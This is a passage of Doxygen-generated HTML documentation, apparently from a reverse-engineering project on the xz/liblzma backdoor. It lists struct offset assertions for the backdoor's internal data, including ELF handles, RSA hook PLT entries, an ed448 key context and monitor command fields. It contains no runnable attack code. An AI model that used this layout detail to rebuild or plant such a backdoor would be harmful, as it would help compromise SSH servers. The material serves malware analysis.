<tr class="memitem:abe7e7d55dc6c030acf0c84a6cfa8ac7d"><td class="memItemLeft" align="right" valign="top"><a id="abe7e7d55dc6c030acf0c84a6cfa8ac7d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a>, hook_params, 0x10)</td></tr>
<tr class="separator:abe7e7d55dc6c030acf0c84a6cfa8ac7d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af5a94e874d57beee98370fe9e1cefd58"><td class="memItemLeft" align="right" valign="top"><a id="af5a94e874d57beee98370fe9e1cefd58"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a>, entry_ctx, 0x80)</td></tr>
<tr class="separator:af5a94e874d57beee98370fe9e1cefd58"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a30e2e711133deaa2b255596805d91662"><td class="memItemLeft" align="right" valign="top"><a id="a30e2e711133deaa2b255596805d91662"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, main, 0x0)</td></tr>
<tr class="separator:a30e2e711133deaa2b255596805d91662"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a31f2241e00fa4e3d0ed40c12df7da2af"><td class="memItemLeft" align="right" valign="top"><a id="a31f2241e00fa4e3d0ed40c12df7da2af"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, dynamic_linker, 0x8)</td></tr>
<tr class="separator:a31f2241e00fa4e3d0ed40c12df7da2af"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a467cc299537ef2bec41b423f4b000e66"><td class="memItemLeft" align="right" valign="top"><a id="a467cc299537ef2bec41b423f4b000e66"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, libc, 0x10)</td></tr>
<tr class="separator:a467cc299537ef2bec41b423f4b000e66"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1748b47f26bba5c9b40fd8bb0adb8c29"><td class="memItemLeft" align="right" valign="top"><a id="a1748b47f26bba5c9b40fd8bb0adb8c29"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, liblzma, 0x18)</td></tr>
<tr class="separator:a1748b47f26bba5c9b40fd8bb0adb8c29"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a476822f11a5fce8a08806fb9e27324e1"><td class="memItemLeft" align="right" valign="top"><a id="a476822f11a5fce8a08806fb9e27324e1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, libcrypto, 0x20)</td></tr>
<tr class="separator:a476822f11a5fce8a08806fb9e27324e1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9cbb5a77a83bd17fe1a3969899edf01b"><td class="memItemLeft" align="right" valign="top"><a id="a9cbb5a77a83bd17fe1a3969899edf01b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structmain__elf.html">main_elf_t</a>, <a class="el" href="structelf__handles.html">elf_handles</a>, 0x0)</td></tr>
<tr class="separator:a9cbb5a77a83bd17fe1a3969899edf01b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a06cc31db44e2af8eebb62e7f0287d696"><td class="memItemLeft" align="right" valign="top"><a id="a06cc31db44e2af8eebb62e7f0287d696"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structmain__elf.html">main_elf_t</a>, dynamic_linker_ehdr, 0x8)</td></tr>
<tr class="separator:a06cc31db44e2af8eebb62e7f0287d696"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a70b389c91d58960da1dfd8b0b8780848"><td class="memItemLeft" align="right" valign="top"><a id="a70b389c91d58960da1dfd8b0b8780848"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structmain__elf.html">main_elf_t</a>, __libc_stack_end, 0x10)</td></tr>
<tr class="separator:a70b389c91d58960da1dfd8b0b8780848"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad240914d1020a2c6cc4af519cf312dd9"><td class="memItemLeft" align="right" valign="top"><a id="ad240914d1020a2c6cc4af519cf312dd9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a>, data, 0x0)</td></tr>
<tr class="separator:ad240914d1020a2c6cc4af519cf312dd9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2934e1fc87c15302b153d4cc15f1f9c4"><td class="memItemLeft" align="right" valign="top"><a id="a2934e1fc87c15302b153d4cc15f1f9c4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a>, <a class="el" href="structelf__handles.html">elf_handles</a>, 0x8)</td></tr>
<tr class="separator:a2934e1fc87c15302b153d4cc15f1f9c4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af352f2a1a6fe02696c84847b8b22b232"><td class="memItemLeft" align="right" valign="top"><a id="af352f2a1a6fe02696c84847b8b22b232"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__item.html">string_item_t</a>, string_id, 0)</td></tr>
<tr class="separator:af352f2a1a6fe02696c84847b8b22b232"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a53d4dda2d80d1fc12a7092555beba489"><td class="memItemLeft" align="right" valign="top"><a id="a53d4dda2d80d1fc12a7092555beba489"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__item.html">string_item_t</a>, func_start, 0x8)</td></tr>
<tr class="separator:a53d4dda2d80d1fc12a7092555beba489"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2824c1a253ee8e49df065590ebcdf28a"><td class="memItemLeft" align="right" valign="top"><a id="a2824c1a253ee8e49df065590ebcdf28a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__item.html">string_item_t</a>, func_end, 0x10)</td></tr>
<tr class="separator:a2824c1a253ee8e49df065590ebcdf28a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa9a770c4990f74a15bc966a3e438bff5"><td class="memItemLeft" align="right" valign="top"><a id="aa9a770c4990f74a15bc966a3e438bff5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__item.html">string_item_t</a>, xref, 0x18)</td></tr>
<tr class="separator:aa9a770c4990f74a15bc966a3e438bff5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae9d90f49c0e37f93062bf2a5761699ae"><td class="memItemLeft" align="right" valign="top"><a id="ae9d90f49c0e37f93062bf2a5761699ae"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__references.html">string_references_t</a>, entries, 0)</td></tr>
<tr class="separator:ae9d90f49c0e37f93062bf2a5761699ae"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac5e80dc08a6eb1a376410812c0feae22"><td class="memItemLeft" align="right" valign="top"><a id="ac5e80dc08a6eb1a376410812c0feae22"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, main_map, 0)</td></tr>
<tr class="separator:ac5e80dc08a6eb1a376410812c0feae22"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a91a1c0dbea4cf420e221a0cb2bf403e1"><td class="memItemLeft" align="right" valign="top"><a id="a91a1c0dbea4cf420e221a0cb2bf403e1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, dynamic_linker_map, 0x8)</td></tr>
<tr class="separator:a91a1c0dbea4cf420e221a0cb2bf403e1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a10bb954aaa78f8845d4a31edf731f313"><td class="memItemLeft" align="right" valign="top"><a id="a10bb954aaa78f8845d4a31edf731f313"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, liblzma_map, 0x10)</td></tr>
<tr class="separator:a10bb954aaa78f8845d4a31edf731f313"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3c3046b4e3cd83077072f55f42b0e7ab"><td class="memItemLeft" align="right" valign="top"><a id="a3c3046b4e3cd83077072f55f42b0e7ab"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libcrypto_map, 0x18)</td></tr>
<tr class="separator:a3c3046b4e3cd83077072f55f42b0e7ab"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a90849f8226700f9fc9e8806123002876"><td class="memItemLeft" align="right" valign="top"><a id="a90849f8226700f9fc9e8806123002876"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libsystemd_map, 0x20)</td></tr>
<tr class="separator:a90849f8226700f9fc9e8806123002876"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abb27d2315a6c64e5a8273d08e9073f13"><td class="memItemLeft" align="right" valign="top"><a id="abb27d2315a6c64e5a8273d08e9073f13"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libc_map, 0x28)</td></tr>
<tr class="separator:abb27d2315a6c64e5a8273d08e9073f13"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa496711b73ba8684046af04317b727cf"><td class="memItemLeft" align="right" valign="top"><a id="aa496711b73ba8684046af04317b727cf"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, <a class="el" href="structelf__handles.html">elf_handles</a>, 0x30)</td></tr>
<tr class="separator:aa496711b73ba8684046af04317b727cf"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a67b0548dc0412f3725ff18a96ea58a96"><td class="memItemLeft" align="right" valign="top"><a id="a67b0548dc0412f3725ff18a96ea58a96"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, data_handle, 0x58)</td></tr>
<tr class="separator:a67b0548dc0412f3725ff18a96ea58a96"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a260462b3ca60420fad0b46e3dc5c00a6"><td class="memItemLeft" align="right" valign="top"><a id="a260462b3ca60420fad0b46e3dc5c00a6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, main_info, 0x68)</td></tr>
<tr class="separator:a260462b3ca60420fad0b46e3dc5c00a6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9fbcadb5c1ecbdad462e3b6f243fb919"><td class="memItemLeft" align="right" valign="top"><a id="a9fbcadb5c1ecbdad462e3b6f243fb919"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, dynamic_linker_info, 0x168)</td></tr>
<tr class="separator:a9fbcadb5c1ecbdad462e3b6f243fb919"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2a4053fbbd30f6e722605f9b0a686ec4"><td class="memItemLeft" align="right" valign="top"><a id="a2a4053fbbd30f6e722605f9b0a686ec4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libc_info, 0x268)</td></tr>
<tr class="separator:a2a4053fbbd30f6e722605f9b0a686ec4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad689576e1b53734ce16d9c110c52c6da"><td class="memItemLeft" align="right" valign="top"><a id="ad689576e1b53734ce16d9c110c52c6da"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, liblzma_info, 0x368)</td></tr>
<tr class="separator:ad689576e1b53734ce16d9c110c52c6da"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3fe5fa8a2a464ceeef178a3bfee0febb"><td class="memItemLeft" align="right" valign="top"><a id="a3fe5fa8a2a464ceeef178a3bfee0febb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libcrypto_info, 0x468)</td></tr>
<tr class="separator:a3fe5fa8a2a464ceeef178a3bfee0febb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acea945d4b1eb08cb3d5826e9bf5418ab"><td class="memItemLeft" align="right" valign="top"><a id="acea945d4b1eb08cb3d5826e9bf5418ab"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, <a class="el" href="structlibc__imports.html">libc_imports</a>, 0x568)</td></tr>
<tr class="separator:acea945d4b1eb08cb3d5826e9bf5418ab"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aca6d436cdf44b54819ddc0a99810cfe8"><td class="memItemLeft" align="right" valign="top"><a id="aca6d436cdf44b54819ddc0a99810cfe8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, string_refs, 0x5D8)</td></tr>
<tr class="separator:aca6d436cdf44b54819ddc0a99810cfe8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a038c0f79147c730a0cb9f62f18140d4d"><td class="memItemLeft" align="right" valign="top"><a id="a038c0f79147c730a0cb9f62f18140d4d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, fake_allocator, 0x938)</td></tr>
<tr class="separator:a038c0f79147c730a0cb9f62f18140d4d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a80339b10786531e6061e8087045c92d9"><td class="memItemLeft" align="right" valign="top"><a id="a80339b10786531e6061e8087045c92d9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, import_resolver, 0x950)</td></tr>
<tr class="separator:a80339b10786531e6061e8087045c92d9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac82e17a1f10bad69aa9680e89dae0fc1"><td class="memItemLeft" align="right" valign="top"><a id="ac82e17a1f10bad69aa9680e89dae0fc1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, data, 0x0)</td></tr>
<tr class="separator:ac82e17a1f10bad69aa9680e89dae0fc1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3d720c43910725c7479e25f27f309da4"><td class="memItemLeft" align="right" valign="top"><a id="a3d720c43910725c7479e25f27f309da4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, <a class="el" href="structelf__handles.html">elf_handles</a>, 0x8)</td></tr>
<tr class="separator:a3d720c43910725c7479e25f27f309da4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a31e98f956a800bd4a1225bf55a3aa330"><td class="memItemLeft" align="right" valign="top"><a id="a31e98f956a800bd4a1225bf55a3aa330"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, RSA_public_decrypt_plt, 0x10)</td></tr>
<tr class="separator:a31e98f956a800bd4a1225bf55a3aa330"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3efdae1a777a083bfa07e08ce43d0067"><td class="memItemLeft" align="right" valign="top"><a id="a3efdae1a777a083bfa07e08ce43d0067"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, EVP_PKEY_set1_RSA_plt, 0x18)</td></tr>
<tr class="separator:a3efdae1a777a083bfa07e08ce43d0067"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae70d01b72cb58a9864222197718b4ced"><td class="memItemLeft" align="right" valign="top"><a id="ae70d01b72cb58a9864222197718b4ced"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, RSA_get0_key_plt, 0x20)</td></tr>
<tr class="separator:ae70d01b72cb58a9864222197718b4ced"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae30af5ee4b4881644582687ab91b3a26"><td class="memItemLeft" align="right" valign="top"><a id="ae30af5ee4b4881644582687ab91b3a26"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, <a class="el" href="xzre_8h.html#a32c97a88bc607d3f2459f0d7d420099d">hooks_data_addr</a>, 0x28)</td></tr>
<tr class="separator:ae30af5ee4b4881644582687ab91b3a26"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1451f92c8f0cf7451ffdb8dfcd799742"><td class="memItemLeft" align="right" valign="top"><a id="a1451f92c8f0cf7451ffdb8dfcd799742"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, <a class="el" href="structlibc__imports.html">libc_imports</a>, 0x30)</td></tr>
<tr class="separator:a1451f92c8f0cf7451ffdb8dfcd799742"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0e446193b6974ff6c3c6f18acf57127d"><td class="memItemLeft" align="right" valign="top"><a id="a0e446193b6974ff6c3c6f18acf57127d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsecret__data__item.html">secret_data_item_t</a>, code, 0x0)</td></tr>
<tr class="separator:a0e446193b6974ff6c3c6f18acf57127d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af2b5d70c34c0072575a2ab40e871b9ce"><td class="memItemLeft" align="right" valign="top"><a id="af2b5d70c34c0072575a2ab40e871b9ce"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsecret__data__item.html">secret_data_item_t</a>, shift_cursor, 0x8)</td></tr>
<tr class="separator:af2b5d70c34c0072575a2ab40e871b9ce"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaab37b0e09447be60c0c80804613c2bb"><td class="memItemLeft" align="right" valign="top"><a id="aaab37b0e09447be60c0c80804613c2bb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsecret__data__item.html">secret_data_item_t</a>, operation_index, 0xC)</td></tr>
<tr class="separator:aaab37b0e09447be60c0c80804613c2bb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa3ff670ac8cd7690cfd2a79c4c7f531d"><td class="memItemLeft" align="right" valign="top"><a id="aa3ff670ac8cd7690cfd2a79c4c7f531d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsecret__data__item.html">secret_data_item_t</a>, shift_count, 0x10)</td></tr>
<tr class="separator:aa3ff670ac8cd7690cfd2a79c4c7f531d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a11d39f64e1f265389733737a479fb330"><td class="memItemLeft" align="right" valign="top"><a id="a11d39f64e1f265389733737a479fb330"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsecret__data__item.html">secret_data_item_t</a>, index, 0x14)</td></tr>
<tr class="separator:a11d39f64e1f265389733737a479fb330"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac1f4ef10bb34a40d300ab701beb6bf70"><td class="memItemLeft" align="right" valign="top"><a id="ac1f4ef10bb34a40d300ab701beb6bf70"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__payload__body.html">key_payload_body_t</a>, args, 0x72)</td></tr>
<tr class="separator:ac1f4ef10bb34a40d300ab701beb6bf70"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa970c4ef889a63da65319360b6b6a320"><td class="memItemLeft" align="right" valign="top"><a id="aa970c4ef889a63da65319360b6b6a320"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a>, flags1, 0)</td></tr>
<tr class="separator:aa970c4ef889a63da65319360b6b6a320"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa105d857f1825e66aefd1bd84435b0fe"><td class="memItemLeft" align="right" valign="top"><a id="aa105d857f1825e66aefd1bd84435b0fe"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a>, flags2, 1)</td></tr>
<tr class="separator:aa105d857f1825e66aefd1bd84435b0fe"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5d71b89283fd8e1451188363f58a92b7"><td class="memItemLeft" align="right" valign="top"><a id="a5d71b89283fd8e1451188363f58a92b7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a>, flags3, 2)</td></tr>
<tr class="separator:a5d71b89283fd8e1451188363f58a92b7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a16de0e7a5abbf7a012e59994f0f28d57"><td class="memItemLeft" align="right" valign="top"><a id="a16de0e7a5abbf7a012e59994f0f28d57"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a>, u, 3)</td></tr>
<tr class="separator:a16de0e7a5abbf7a012e59994f0f28d57"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a055d1ce09965d2f3689da06cc5fd571a"><td class="memItemLeft" align="right" valign="top"><a id="a055d1ce09965d2f3689da06cc5fd571a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, rsa_n, 0)</td></tr>
<tr class="separator:a055d1ce09965d2f3689da06cc5fd571a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab48eb190c7fc951ac7c45a0d24b8af42"><td class="memItemLeft" align="right" valign="top"><a id="ab48eb190c7fc951ac7c45a0d24b8af42"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, rsa_e, 0x8)</td></tr>
<tr class="separator:ab48eb190c7fc951ac7c45a0d24b8af42"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1c5b1c41fec212ccd3b23bf8976e8eb1"><td class="memItemLeft" align="right" valign="top"><a id="a1c5b1c41fec212ccd3b23bf8976e8eb1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, args, 0x10)</td></tr>
<tr class="separator:a1c5b1c41fec212ccd3b23bf8976e8eb1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a667cb717343a98ce25a91c16911da1dc"><td class="memItemLeft" align="right" valign="top"><a id="a667cb717343a98ce25a91c16911da1dc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, payload, 0x15)</td></tr>
<tr class="separator:a667cb717343a98ce25a91c16911da1dc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac328ed5f1e095d244d5303d78e14c065"><td class="memItemLeft" align="right" valign="top"><a id="ac328ed5f1e095d244d5303d78e14c065"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, ivec, 0x26D)</td></tr>
<tr class="separator:ac328ed5f1e095d244d5303d78e14c065"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a20d02d053ff51a8b73669da4099c44eb"><td class="memItemLeft" align="right" valign="top"><a id="a20d02d053ff51a8b73669da4099c44eb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, ed448_key, 0x27D)</td></tr>
<tr class="separator:a20d02d053ff51a8b73669da4099c44eb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a70e70aecf2330fb8ddfc40cb6b0c13ef"><td class="memItemLeft" align="right" valign="top"><a id="a70e70aecf2330fb8ddfc40cb6b0c13ef"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a>, cmd_type, 0)</td></tr>
<tr class="separator:a70e70aecf2330fb8ddfc40cb6b0c13ef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a99fd7903426c2d470e463f9d62ebbc5a"><td class="memItemLeft" align="right" valign="top"><a id="a99fd7903426c2d470e463f9d62ebbc5a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a>, args, 0x8)</td></tr>
<tr class="separator:a99fd7903426c2d470e463f9d62ebbc5a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a818fdfa839a601e8b94b9a0d47a7075a"><td class="memItemLeft" align="right" valign="top"><a id="a818fdfa839a601e8b94b9a0d47a7075a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a>, rsa_n, 0x10)</td></tr>
<tr class="separator:a818fdfa839a601e8b94b9a0d47a7075a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4a9792e61741473cc79bf27ea699f0a1"><td class="memItemLeft" align="right" valign="top"><a id="a4a9792e61741473cc79bf27ea699f0a1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a>, rsa_e, 0x18)</td></tr>
<tr class="separator:a4a9792e61741473cc79bf27ea699f0a1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac5d41859b396964aa76272e488366f62"><td class="memItemLeft" align="right" valign="top"><a id="ac5d41859b396964aa76272e488366f62"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a>, payload_body, 0x20)</td></tr>
<tr class="separator:ac5d41859b396964aa76272e488366f62"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad43601e6ba67989690c399509433a871"><td class="memItemLeft" align="right" valign="top"><a id="ad43601e6ba67989690c399509433a871"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a>, payload_body_size, 0x28)</td></tr>
<tr class="separator:ad43601e6ba67989690c399509433a871"><td class="memSeparator" colspan="2">&#160;</td></tr>
